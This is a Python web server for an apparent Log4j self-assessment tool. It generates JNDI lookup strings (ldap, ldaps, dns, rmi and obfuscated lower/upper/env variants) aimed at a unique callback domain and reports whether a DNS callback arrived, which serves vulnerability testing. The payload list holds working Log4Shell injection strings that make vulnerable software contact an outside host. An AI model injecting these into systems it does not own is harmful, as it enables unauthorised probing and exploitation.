# Python 3 server example
import http.server
import socketserver
import sys
from database.database import database
import re
import ssl
dbfile = "./database/dns.db"

payloads = [
    "${jndi:ldap://<domain>}",
    "${jndi:ldaps://<domain>}",
    "${jndi:dns://<domain>}",
    "${jndi:rmi://<domain>}",
    "${jndi:${lower:l}dap://<domain>}",
    "${jndi:${upper:l}dap://<domain>}",
    "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://<domain>}",
    "${${env:NO_WAY_THIS_ENV_NAME_EXISTS:-j}ndi:ldap://<domain>}"
]


class MyHttpRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        print("[WEB] Incoming GET request to: "+self.path)
        try:
            print("[WEB] Going into the switch case")
            if self.path == "/":
                self.path = "index.html"
                return http.server.SimpleHTTPRequestHandler.do_GET(self)
            elif self.path == "/generate.js":
                return http.server.SimpleHTTPRequestHandler.do_GET(self)
            elif self.path == "/log4j.png":
                return http.server.SimpleHTTPRequestHandler.do_GET(self)
            else:
                match = re.match(r"^[a-zA-Z0-9]{30}$", self.path[1:])
                if match:
                    self.send_response(200)
                    self.send_header("Content-type", "text/html")
                    self.end_headers()
                    uri=self.path[1:]
                    domain = uri+"."+dnsserver
                    print("[WEB] Unique domain retrieved: "+uri)

                    result = "ERROR"
                    domain_found = self.get_entry(domain)
                    if domain_found:
                        result = '<div style="color:red;"><b>'
                        result += '!!! A callback has received, the application where you pasted the payload is VULNERABLE'
                        result += '</b></div>'
                    else:
                        result = '<div style="color:green;">'
                        result += "There was no callback from your payload received (yet)."
                        result += '</div>'
                    payload_html =""
                    for payload in payloads:
                        payload_html += payload.replace("<domain>",domain)+"<br/>"
                    html = f"""

<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <meta name="keywords" content="Log4j Self assessment tool" />
    <meta name="description" content="Log4j self assessment tool" />

    <meta property="og:type" content="website" />
    <meta property="og:description" content="Log4j Self assessment tool" />
    <meta property="og:title" content="Log4j Self assessment tool" />
    <meta property="og:url" content="" />
    <meta property="og:image" content="./log4j.png" />
    <meta http-equiv="refresh" content="30">

    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous" />
    <title>
      Log4j Self assessment tool
    </title>
  </head>
  <body>
    <div class="container">

    <h1>Unique string: {uri}</h1>
    <br/></br>
    <b>The application that you are trying to test has to be able to resolve {domain}, otherwise this test will not be reliable!</b> 
    <br/>
    You can test this by generating a unique payload and run: <br/>
    <code>dig {domain}</code><br/>
    The page should show the message that the application is vulnerable.<br/><br/>
    Paste a combination of these payloads in your apps, think about fields and locations that you know/think log4j would log about:
    <br/><br/>
    {payload_html}
    <br/>
    {result}
    <br/>
    It can take a couple of minutes before the results have been processed. (Page auto-refreshes every 30 seconds)
    <br/><br/>
    If you did not yet pasted these payloads in your applications, and it already tells you it is vulnerable, please regenerate the payloads via the main page!
    </div>
    </body>
    </html>
"""

                    self.wfile.write(bytes(html, "utf8"))
                    return
                else:
                    self.send_response(404)
                    self.send_header("Content-type", "text/html")
                    self.end_headers()
                    print("[WEB] page does not exist, returning 404")
                    self.wfile.write(bytes("<html>404</html>", "utf8"))
                    return


            print("[WEB] Case broken")
            self.send_response(500)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(bytes("<html>500</html>", "utf8"))
            return
        except Exception as e:
            print("[WEB] Request raised an exception")
            print(e)
            self.send_response(500)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(bytes("<html>500</html>", "utf8"))
            return

    def get_entry(self, entry):
        return db.get_entry(entry)


if __name__ == "__main__":

    if len(sys.argv) != 3:
        print("Usage: "+sys.argv[0]+" <domain of dns server> <path with TLS files>")
        print("Make sure you point the NS record of the provided domain to the external IP of this server")
        exit()

    dnsserver=sys.argv[1]
    ssl_path=sys.argv[2]

    print("[MAIN] WEBSERVER STARTED")
    print("[MAIN] DNS SERVER AT: "+dnsserver)
    print("[MAIN] Make sure this domain is configured an an authoritive nameserver using the NS record at your DNS registrar!")
    print("[MAIN] SSL Path used: "+ssl_path)
    handler_object = MyHttpRequestHandler

    db = database(dbfile)

    PORT = 8443
    my_server = socketserver.TCPServer(("", PORT), handler_object)

    ssl_key_file = sys.argv[2]+"/privkey.pem"
    ssl_cert_file = sys.argv[2]+"/fullchain.pem"

    my_server.socket = ssl.wrap_socket (my_server.socket, server_side=True, keyfile=ssl_key_file, certfile=ssl_cert_file)

    try:
        my_server.serve_forever()
    except KeyboardInterrupt:
        pass

    my_server.server_close()
    print("[MAIN] Server stopped.")
